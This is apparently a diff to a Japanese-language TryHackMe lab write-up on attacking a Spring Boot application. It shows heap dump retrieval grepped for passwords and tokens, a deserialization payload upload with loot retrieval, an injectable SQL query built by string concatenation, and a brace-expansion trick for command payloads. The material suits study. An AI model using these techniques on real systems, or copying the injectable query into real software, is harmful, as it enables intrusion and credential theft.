@@ -43,6 +43,13 @@ root@TryHackMe:~# curl -s http://10.146.173.58:8080/actuator/heapdump -o heap.hp
 root@TryHackMe:~# strings heap.hprof | grep -iE 'password|secret|token' | sort -u | head
 ```
 
+## SQLi
+
+```java
+String sql = "SELECT id, title, body FROM articles WHERE title = '" + q + "'";
+List<Map<String, Object>> rows = jdbc.queryForList(sql);
+```
+
 ## マスアサインメント
 
 例えば role などがユーザーから送信されて更新される危険性がある。
@@ -120,4 +127,16 @@ root@TryHackMe:~# $ java --add-opens=java.base/java.util=ALL-UNNAMED \
 root@TryHackMe:~# curl -s -X POST http://10.146.173.58:8080/internal/import --data-binary @payload.b64
 
 root@TryHackMe:~# curl -s http://10.146.173.58:8080/loot/out.txt
+```
+
+2のような数字単体が含まれている場合など、デシリアライズでエラーになることがある。
+
+```sh
+'ping -c 2 192.168.131.34'
+```
+
+その場合、下記のような構文で回避できる可能性がある。
+
+```sh
+'sh -c {ping,-c,2,192.168.131.34}'
 ```
